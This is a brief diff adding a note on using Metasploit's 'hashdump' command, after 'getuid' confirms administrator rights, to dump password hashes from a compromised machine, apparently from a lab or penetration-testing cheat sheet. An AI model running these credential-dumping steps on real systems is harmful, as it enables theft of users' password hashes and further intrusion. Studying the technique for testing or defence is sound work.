@@ -1,0 +1,7 @@
+We can use Metasploit's built in feature named "hashdump" in order to 
+recover the hashes of some passwords.
+
+getuid to see if you are administrator
+hashdump # start getting the hashes
+
+
